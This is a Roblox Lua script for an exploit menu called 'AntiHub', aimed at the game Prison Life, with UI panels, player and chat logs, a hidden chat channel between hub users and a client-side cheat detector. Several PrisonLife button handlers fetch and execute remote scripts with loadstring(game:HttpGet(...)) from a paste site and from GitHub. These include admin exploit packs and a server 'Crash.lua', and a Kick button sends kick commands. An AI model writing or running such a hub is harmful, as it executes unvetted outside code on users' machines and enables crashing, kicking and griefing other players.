local AntiHub = Converted._AntiHub
local Visible = true
local VisWait = false
local MenWait = false
local Keybind = "R"
local UIPos = UDim2.new(0, 0, 0, 0)
local Expanded = true
local Menu = "PrisonLife"
local Chat = AntiHub:WaitForChild("TitleBar"):WaitForChild("Container"):WaitForChild("Container"):WaitForChild("Menus"):WaitForChild("Chat")
local PrisonLife = AntiHub.TitleBar.Container.Container.Menus.PrisonLife
local Universal = AntiHub.TitleBar.Container.Container.Menus.Universal
local Logs = AntiHub.TitleBar.Container.Container.Menus.Logs
local AntiCheat = AntiHub.TitleBar.Container.Container.Menus.AntiCheat
local Players = AntiHub.TitleBar.Container.Container.Menus.Players
local Config = {}
Config.AC = {}
Config.AC.AutoWhiteList = true
Config.AC.Toast = false
Config.AC.Enabled = true
Config.AC.List = {}
Config.AC.Messages = {}
Config.AC.CanSend = {}
Config.AC.Whitelist = {game:GetService("Players").LocalPlayer}
Config.Ping = 0
Config.FPS = 0
local Team = {}
local HidChat = game:GetService("Players").Chat
local function HubChat(msg)
	HidChat(game:GetService("Players"), "TNEChatAH".. msg)
end
AntiHub.Parent = game:GetService("Players").LocalPlayer.PlayerGui
local function GetCurrentTime()
	return DateTime.now():ToLocalTime().Hour.. ":".. DateTime.now():ToLocalTime().Minute.. ":".. DateTime.now():ToLocalTime().Second
end

local function GetUnshortened(inp)
	local Found = {}
	local strl = inp:lower()
	for i,v in pairs(game:FindService("Players"):GetPlayers()) do
		if v.Name:lower():sub(1, #inp) == inp:lower() then
			table.insert(Found,v)
		end
	end 
	return Found[1]
end

local function ACTrigger(plr, Reason, Respawn)
	if table.find(Config.AC.Whitelist, plr) then return end
	if Respawn then return end
	if plr.Team == game.Teams.Neutral then return end
	if plr.Character == nil then return end
	if plr.Character:WaitForChild("Humanoid").Sit then return end
	if table.find(Config.AC.CanSend, plr.Name.. " ".. Reason) then return end
	if string.len(AntiCheat.Logs.Log.Text) + string.len(GetCurrentTime().. " \"".. plr.Name.. "\" Triggered: ".. Reason) >= 16385 then
		AntiCheat.Logs.Log.Text = AntiCheat.Logs.Log.Text:sub(1, string.len(AntiCheat.Logs.Log.Text) - string.len(GetCurrentTime().. " \"".. plr.Name.. "\" Triggered: ".. Reason))
	end
	AntiCheat.Logs.Log.Text ..= GetCurrentTime().. " \"".. plr.Name.. "\" Triggered: ".. Reason
	AntiCheat.Logs.CanvasSize = UDim2.new(0, 0, 0, AntiCheat.Logs.Log.TextBounds.Y)
	AntiCheat.Logs.CanvasPosition = Vector2.new(0, AntiCheat.Logs.CanvasSize.Y.Offset - AntiCheat.Logs.AbsoluteWindowSize.Y)
	if Config.AC.Toast then
		game:GetService("StarterGui"):SetCore("SendNotification", {["Title"] = "AC - ".. plr.Name, ["Text"] = "Detected ".. Reason, ["Duration"] = 2})
		task.wait(2)
	end
	table.remove(Config.AC.CanSend, table.find(Config.AC.CanSend, plr.Name.. " ".. Reason))
end

local function UpdatePlayerList()
	local List = {}
	for i, v in game:GetService("Players"):GetPlayers() do
		if table.find(Config.AC.Whitelist, v) then
			table.insert(List, tostring(i).. ". <font color=\"rgb(0,178,0)\">".. v.Name.. "</font> <font color=\"rgb(".. tostring(math.round(255 * v.TeamColor.Color.R)).. ",".. tostring(math.round(255 * v.TeamColor.Color.G)).. ",".. tostring(math.round(255 * v.TeamColor.Color.B)).. ")\"> (".. v.Team.Name.. ")</font>")
		else
			table.insert(List, tostring(i).. ". <font color=\"rgb(178,0,0)\">".. v.Name.. "</font> <font color=\"rgb(".. tostring(math.round(255 * v.TeamColor.Color.R)).. ",".. tostring(math.round(255 * v.TeamColor.Color.G)).. ",".. tostring(math.round(255 * v.TeamColor.Color.B)).. ")\"> (".. v.Team.Name.. ")</font>")
		end
	end
	Players.List.Players.Text = table.concat(List, "\n")
	Players.List.CanvasSize = UDim2.new(0, 0, 0, Players.List.Players.TextBounds.Y)
end

local function UpdateWhitelist()
	local String = ""
	for i, v in Config.AC.Whitelist do
		if i == #Config.AC.Whitelist then
			String ..= tostring(i).. ". ".. v.Name
		else
			String ..= tostring(i).. ". ".. v.Name.. "\n"
		end
	end
	AntiCheat:WaitForChild("Whitelist")
	AntiCheat.Whitelist.Players.Text = String
	AntiCheat.Whitelist.CanvasSize = UDim2.new(0, 0, 0, AntiCheat.Whitelist.Players.TextBounds.Y)
	AntiCheat.Whitelist.CanvasPosition = Vector2.new(0, AntiCheat.Whitelist.CanvasSize.Y.Offset - AntiCheat.Whitelist.AbsoluteWindowSize.Y)
	UpdatePlayerList()
end

local function OnMessage(plr, msg)
	if plr == game:GetService("Players").LocalPlayer then return end
	if msg:sub(1, 9) == "TNEChatAH" then
		local Message = msg:sub(10)
		if string.len(Chat.Logs.Chat.Text) + string.len(Message) >= 16385 then
			Chat.Logs.Chat.Text = Chat.Logs.Chat.Text:sub(1, 	string.len(Chat.Logs.Chat.Text) - string.len(Message))
		end
		Chat.Logs.Chat.Text ..= "<b>".. plr.DisplayName.. ":</b> ".. Message.. "\n"
		Chat.Logs.CanvasSize = UDim2.new(0, 0, 0, Chat.Logs.Chat	.TextBounds.Y)
		Chat.Logs.CanvasPosition = Vector2.new(0, Chat.Logs.CanvasSize.Y.Offset - Chat.Logs.AbsoluteWindowSize.Y)
	elseif msg == "TNEListStart" then
		if not table.find(Team, plr) then
			table.insert(Team, plr)
			if Config.AC.AutoWhiteList then
				table.insert(Config.AC.Whitelist, plr)
				UpdateWhitelist()
			end
			HidChat(game:GetService("Players"), "TNEListUpdate")
		end
	elseif msg == "TNEListUpdate" then
		if not table.find(Team, plr) then
			table.insert(Team, plr)
			if Config.AC.AutoWhiteList then
				table.insert(Config.AC.Whitelist, plr)
				UpdateWhitelist()
			end
		end
	end
	if string.len(Logs.Chat.Log.Text) + string.len(" ".. plr.DisplayName.. ": ".. msg.. "\n") >= 16385 then
		Logs.Chat.Log.Text = Logs.Chat.Log.Text:sub(1, string.len(Logs.Chat.Log.Text) - string.len(" ".. plr.DisplayName.. ": ".. msg.. "\n"))
	end
	Logs.Chat.Log.Text ..= GetCurrentTime().. " <b>".. plr.DisplayName.. ":</b> ".. msg.. "\n"
	Logs.Chat.CanvasSize = UDim2.new(0, 0, 0, Logs.Chat.Log.TextBounds.Y)
	Logs.Chat.CanvasPosition = Vector2.new(0, Logs.Chat.CanvasSize.Y.Offset - Logs.Chat.AbsoluteWindowSize.Y)
end

AntiHub:WaitForChild("TitleBar").Active = true
AntiHub.TitleBar.Draggable = true

game:GetService("UserInputService").InputBegan:Connect(function(inp, proc)
	if proc then return end
	if inp.KeyCode == Enum.KeyCode:FromName(Keybind) then
		if VisWait then return end
		VisWait = true
		Visible = not Visible
		if Visible then
			game:GetService("TweenService"):Create(AntiHub.TitleBar, TweenInfo.new(0.2, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut), {["Position"] = UIPos, ["Size"] = UDim2.new(0.5, 0, 0.05, 0)}):Play()
			task.wait(0.25)
			if Expanded then
				game:GetService("TweenService"):Create(AntiHub.TitleBar.Container, TweenInfo.new(0.2, Enum.EasingStyle.Sine, Enum.EasingDirection.In), {["Position"] = UDim2.new(0.5, 0, 4.75, 0), ["Size"] = UDim2.new(1, 0, 9.5, 0)}):Play()
			end
		else
			UIPos = AntiHub.TitleBar.Position
			if Expanded then
				game:GetService("TweenService"):Create(AntiHub.TitleBar.Container, TweenInfo.new(0.2, Enum.EasingStyle.Sine, Enum.EasingDirection.In), {["Position"] = UDim2.new(0.5, 0, 0.5, 0), ["Size"] = UDim2.new(1, 0, 1, 0)}):Play()
			end
			task.wait(0.25)
			game:GetService("TweenService"):Create(AntiHub.TitleBar, TweenInfo.new(0.25, Enum.EasingStyle.Linear, Enum.EasingDirection.In), {["Position"] = UIPos - UDim2.new(0.25, 0, 0, 0), ["Size"] = UDim2.new(0.5, 0, 0, 0)}):Play()
		end
		task.wait(0.25)
		VisWait = false
	end
end)

AntiHub.TitleBar:WaitForChild("Close").Activated:Connect(function()
	if VisWait then return end
	VisWait = true
	Visible = false
	UIPos = AntiHub.TitleBar.Position
	if Expanded then
		game:GetService("TweenService"):Create(AntiHub.TitleBar.Container, TweenInfo.new(0.2, Enum.EasingStyle.Sine, Enum.EasingDirection.In), {["Position"] = UDim2.new(0.5, 0, 0.5, 0), ["Size"] = UDim2.new(1, 0, 1, 0)}):Play()
	end
	task.wait(0.25)
	game:GetService("TweenService"):Create(AntiHub.TitleBar, TweenInfo.new(0.25, Enum.EasingStyle.Linear, Enum.EasingDirection.In), {["Position"] = UIPos - UDim2.new(0.25, 0, 0, 0), ["Size"] = UDim2.new(0.5, 0, 0, 0)}):Play()
	VisWait = false
end)

AntiHub.TitleBar.Collapse.Activated:Connect(function()
	if VisWait then return end
	Expanded = not Expanded
	VisWait = true
	if Expanded then
		game:GetService("TweenService"):Create(AntiHub.TitleBar.Container, TweenInfo.new(0.2, Enum.EasingStyle.Sine, Enum.EasingDirection.In), {["Position"] = UDim2.new(0.5, 0, 4.75, 0), ["Size"] = UDim2.new(1, 0, 9.5, 0)}):Play()
	else
		game:GetService("TweenService"):Create(AntiHub.TitleBar.Container, TweenInfo.new(0.2, Enum.EasingStyle.Sine, Enum.EasingDirection.In), {["Position"] = UDim2.new(0.5, 0, 0, 0), ["Size"] = UDim2.new(1, 0, 0, 0)}):Play()
	end
	task.wait(0.2)
	VisWait = false
end)

for i, v in AntiHub.TitleBar.Container.Container.List:GetChildren() do
	v.Activated:Connect(function()
		if Menu == v.Name then return end
		if MenWait then return end
		MenWait = true
		AntiHub.TitleBar.Container.Container.Menus[v.Name].Visible = true
		game:GetService("TweenService"):Create(AntiHub.TitleBar.Container.Container.Menus[Menu], TweenInfo.new(0.1, Enum.EasingStyle.Linear, Enum.EasingDirection.In), {["GroupTransparency"] = 1}):Play()
		game:GetService("TweenService"):Create(AntiHub.TitleBar.Container.Container.Menus[v.Name], TweenInfo.new(0.1, Enum.EasingStyle.Linear, Enum.EasingDirection.In), {["GroupTransparency"] = 0}):Play()
		task.wait(0.1)
		AntiHub.TitleBar.Container.Container.Menus[Menu].Visible = false
		Menu = v.Name
		MenWait = false
	end)
end

for i, v in AntiHub.TitleBar.Container.Container.Menus:GetChildren() do
	v.Visible = false
	v.GroupTransparency = 1
end
AntiHub.TitleBar.Container.Container.Menus[Menu].Visible = true
AntiHub.TitleBar.Container.Container.Menus[Menu].GroupTransparency = 0

for i, v in game:GetService("Players"):GetPlayers() do
	v:GetPropertyChangedSignal("Team"):Connect(UpdatePlayerList)
	if v == game:GetService("Players").LocalPlayer then continue end
	v.Chatted:Connect(function(msg)
		OnMessage(v, msg)
	end)
end


game:GetService("Players").PlayerAdded:Connect(function(plr)
	if string.len(Logs.Player.Log.Text) + string.len(GetCurrentTime().. plr.Name.. " (".. plr.DisplayName..  ") Joined!") >= 16385 then
		Logs.Player.Log.Text = Logs.Player.Log.Text:sub(1, string.len(Logs.Player.Log.Text) - string.len(GetCurrentTime().. plr.Name.. " (".. plr.DisplayName..  ") Joined!"))
	end
	Logs.Player.Log.Text ..= GetCurrentTime().. "<font color=\"rgb(0,128,0)\">".. plr.Name.. " (".. plr.DisplayName..  ") Joined!</font>"
	Logs.Player.CanvasSize = UDim2.new(0, 0, 0, Logs.Player.Log.TextBounds.Y)
	Logs.Player.CanvasPosition = Vector2.new(0, Logs.Player.CanvasSize.Y.Offset - Logs.Player.AbsoluteWindowSize.Y)
	UpdatePlayerList()
	plr.Chatted:Connect(function(msg)
		OnMessage(plr, msg)
	end)
	plr:GetPropertyChangedSignal("Team"):Connect(UpdatePlayerList)
end)
game:GetService("Players").PlayerRemoving:Connect(function(plr)
	if string.len(Logs.Player.Log.Text) + string.len(GetCurrentTime().. plr.Name.. " (".. plr.DisplayName..  ") Left.") >= 16385 then
		Logs.Player.Chat.Text = Logs.Player.Log.Text:sub(1, string.len(Logs.Player.Log.Text) - string.len(GetCurrentTime().. plr.Name.. " (".. plr.DisplayName..  ") Left."))
	end
	Logs.Player.Log.Text ..= GetCurrentTime().. "<font color=\"rgb(128,0,0)\">".. plr.Name.. " (".. plr.DisplayName..  ") Left.</font>"
	Logs.Player.CanvasSize = UDim2.new(0, 0, 0, Logs.Player.Log.TextBounds.Y)
	Logs.Player.CanvasPosition = Vector2.new(0, Logs.Player.CanvasSize.Y.Offset - Logs.Player.AbsoluteWindowSize.Y)
	if table.find(Config.AC.Whitelist, plr) then
		table.remove(Config.AC.Whitelist, table.find(Config.AC.Whitelist, plr))
		UpdateWhitelist()
	else
		UpdatePlayerList()
	end
end)

UpdatePlayerList()

Players.Refresh.Activated:Connect(function()
	HidChat(game:GetService("Players"), "TNEListStart")
	task.wait(1)
	UpdatePlayerList()
end)

AntiCheat.Input.FocusLost:Connect(function(EP)
	if EP then
		if GetUnshortened(AntiCheat.Input.Text) ~= nil then
			AntiCheat.Input.Text = GetUnshortened(AntiCheat.Input.Text).Name
		end
	end
end)

AntiCheat.Toggle.Activated:Connect(function()
	if game:GetService("Players"):FindFirstChild(AntiCheat.Input.Text) == nil then return end
	if table.find(Config.AC.Whitelist, game:GetService("Players"):FindFirstChild(AntiCheat.Input.Text)) then
		table.remove(Config.AC.Whitelist, table.find(Config.AC.Whitelist, game:GetService("Players"):FindFirstChild(AntiCheat.Input.Text)))
	else
		table.insert(Config.AC.Whitelist, game:GetService("Players"):FindFirstChild(AntiCheat.Input.Text))
	end
	UpdateWhitelist()
end)

AntiCheat.Clear.Activated:Connect(function()
	Config.AC.Whitelist = {}
	UpdateWhitelist()
end)

AntiCheat.AWL.Activated:Connect(function()
	Config.AC.AutoWhiteList = not Config.AC.AutoWhiteList
	if Config.AC.AutoWhiteList then
		AntiCheat.AWL.Text = "Disable Auto WL"
	else
		AntiCheat.AWL.Text = "Enable Auto WL"
	end
end)

AntiCheat.ACToggle.Activated:Connect(function()
	Config.AC.Enabled = not Config.AC.Enabled
	if Config.AC.Enabled then
		AntiCheat.ACToggle.Text = "Disable Anti Cheat"
	else
		AntiCheat.ACToggle.Text = "Enable Anti Cheat"
	end
end)

AntiCheat.ToastToggle.Activated:Connect(function()
	Config.AC.Toast = not Config.AC.Toast
	if Config.AC.Toast then
		AntiCheat.ToastToggle.Text = "Disable Toast"
	else
		AntiCheat.ToastToggle.Text = "Enable Toast"
	end
end)

PrisonLife.Prizz.Activated:Connect(function()
	Execution_Runtime = tick()
	PLadmin_Settings = {
		DefaultPrefix = "?",
		JoinNotify = false,
		AutoRespawn = true,
		AntiVoid = true,
		AntiTase = false,
		AntiArrest = false,
		AntiShoot = false,
		AntiPunch = false,
		AntiFling = true,
		AntiShield = true,
		AntiBring = true,
		SilentAim = false,
		AutoGuns = false,
		OldItemMethod = false,
		Fullbright = false,
		WhitelistRanked = true,
		RankedNukeCmds = true,
		RankedMultiCmd = true,
		RankedOutput = true,
		WhisperToRanked = true,
	}
	wait()
	loadstring(game:HttpGet("https://paste.c-net.org/MailboxScurry",true))()
end)

PrisonLife.H4X.Activated:Connect(function()
	pcall(function()
		getgenv().FavoriteColor = Color3.fromRGB(80, 0, 10)
	end)
	loadstring(game:HttpGet("https://raw.githubusercontent.com/yTevezz1/SCRIPTADMINPRISONLIFE/main/H4X-ADMIN-V1"))()
end)
PrisonLife.Tiger.Activated:Connect(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/J0BB0T/Scripts/refs/heads/main/Tiger.lua"))()
end)
PrisonLife.PWare.Activated:Connect(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/Denverrz/scripts/master/PRISONWARE_v1.3.txt"))()
end)
PrisonLife.Crash.Activated:Connect(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/J0BB0T/TNE/refs/heads/main/Crash.lua"))()
end)

PrisonLife.Kick.Activated:Connect(function()
	HidChat(game:GetService("Players"), "!kick ".. PrisonLife.Input.Text)
	PrisonLife.Input.Text = ""
end)

Chat.Send.Activated:Connect(function()
	if string.len(Chat.Logs.Chat.Text) + string.len("<b>You:</b> ".. Chat.Input.Text.. "\n") >= 16385 then
		Chat.Logs.Chat.Text = Chat.Logs.Chat.Text:sub(1, string.len(Chat.Logs.Chat.Text) - string.len("<b>You:</b> ".. Chat.Input.Text.. "\n"))
	end
	Chat.Logs.Chat.Text ..= "<b>You:</b> ".. Chat.Input.Text.. "\n"
	Chat.Logs.CanvasSize = UDim2.new(0, 0, 0, Chat.Logs.Chat.TextBounds.Y)
	Chat.Logs.CanvasPosition = Vector2.new(0, Chat.Logs.CanvasSize.Y.Offset - Chat.Logs.AbsoluteWindowSize.Y)
	HubChat(Chat.Input.Text)
end)

Chat.Input.FocusLost:Connect(function(EP)
	if EP then
		if string.len(Chat.Logs.Chat.Text) + string.len("<b>You:</b> ".. Chat.Input.Text.. "\n") >= 16385 then
			Chat.Logs.Chat.Text = Chat.Logs.Chat.Text:sub(1, string.len(Chat.Logs.Chat.Text) - string.len("<b>You:</b> ".. Chat.Input.Text.. "\n"))
		end
		Chat.Logs.Chat.Text ..= "<b>You:</b> ".. Chat.Input.Text.. "\n"
		Chat.Logs.CanvasSize = UDim2.new(0, 0, 0, Chat.Logs.Chat.TextBounds.Y)
		Chat.Logs.CanvasPosition = Vector2.new(0, Chat.Logs.CanvasSize.Y.Offset - Chat.Logs.AbsoluteWindowSize.Y)
		HubChat(Chat.Input.Text)
		Chat.Input.Text = ""
	end
end)

task.spawn(function()
	local function AddAC(plr:Player)
		if plr == game:GetService("Players").LocalPlayer then return end
		if table.find(Config.AC.List, plr) then return end
		table.insert(Config.AC.List, plr)
		local Char = plr.Character or plr.CharacterAdded:Wait()
		local Team = plr.Team
		local TeamTime = os.time()
		local FlyTime = os.time()
		local FlyTriggered = false
		local FloorMaterial = Enum.Material.SmoothPlastic
		local CPos = Char:GetPivot().Position
		local Respawn = false
		local Jumped = false
		plr.CharacterAdded:Connect(function(mod)
			Jumped = false
			repeat
				Jumped = Char:WaitForChild("Humanoid").Jump
				task.wait()
			until Jumped
			Respawn = true
			Char = mod
			task.wait(0.5)
			Respawn = false
		end)

		--<[Speed]>--
		task.spawn(function()
			while task.wait() do
				if not table.find(game:GetService("Players"):GetPlayers(), plr) then return end
				if Config.FPS >= 20 then
					if (Char:GetPivot().Position - CPos).Magnitude >= math.clamp(Config.Ping / 100, 14, math.huge) then
						if (Char:GetPivot().Position - CPos).Magnitude <= math.clamp(Config.Ping / 10, 35, math.huge) then
							ACTrigger(plr, "Speed", Respawn)
						else
							ACTrigger(plr, "Teleport", Respawn)
						end
					end
				end
				CPos = Char:GetPivot().Position
			end
		end)

		--<[Flight]>--
		task.spawn(function()
			FlyTime = os.time()
			while task.wait() do
				if not table.find(game:GetService("Players"):GetPlayers(), plr) then return end
				if Char:WaitForChild("Humanoid").FloorMaterial == Enum.Material.Air then
					repeat task.wait() until Char.Humanoid.FloorMaterial ~= Enum.Material.Air
				else
					FlyTime = os.time()
				end
			end
		end)

		task.spawn(function()
			while task.wait(1) do
				if not table.find(game:GetService("Players"):GetPlayers(), plr) then return end
				-- and Char:GetPivot().UpVector:Dot(Vector3.new(0, 1, 0)) <= 0.975 
				if os.time() - FlyTime > 8 then
					if Char:WaitForChild("Humanoid").FloorMaterial == Enum.Material.Air and Jumped then
						ACTrigger(plr, "Flight", Respawn)
					end
				end
			end
		end)

		--<[Teams]>--
		plr:GetPropertyChangedSignal("Team"):Connect(function()
			if os.time() - TeamTime < 2 then
				ACTrigger(plr, "Attempted Mass Kill", Respawn)
			end
			TeamTime = os.time()
		end)
	end

	task.spawn(function()
		game:GetService("Players").PlayerAdded:Connect(AddAC)

		for i, v in game:GetService("Players"):GetPlayers() do
			AddAC(v)
		end

		game:GetService("Players").PlayerRemoving:Connect(function(plr)
			if plr == game:GetService("Players").LocalPlayer then return end
			table.remove(Config.AC.List, table.find(Config.AC.List, plr))
		end)
	end)

	game:GetService("RunService").RenderStepped:Connect(function(DT)
		Config.FPS = 1 / DT
	end)

	game:GetService("UserInputService").InputBegan:Connect(function(inp, proc)
		if proc then return end
		if inp.KeyCode == Enum.KeyCode.L then
			print("Users Under Anticheat (\n> ".. table.concat(Config.AC.List, ", ").. "\n)")
		end
	end)
	print("Real Anticheat Loaded.")

	local suc = false
	repeat
		suc = pcall(function()
			game:GetService("StarterGui"):SetCore("SendNotificaiton", {["Title"] = "Anticheat", ["Text"] = "Real Anticheat Loaded.", ["Duration"] = 5})
		end)
		task.wait()
	until suc

	while task.wait() do
		Config.Ping = game:GetService("Players").LocalPlayer:GetNetworkPing() * 2000
	end
end)

Players.Key.Text = "<font color=\"rgb(178,0,0)\">Normal User</font> | <font color=\"rgb(0,178,0)\">AntiHub User</font>"

HidChat(game:GetService("Players"), "TNEListStart")

print("AH LOADED VERSION I DONT KNOW THIS IS JUST TEMPORARY")
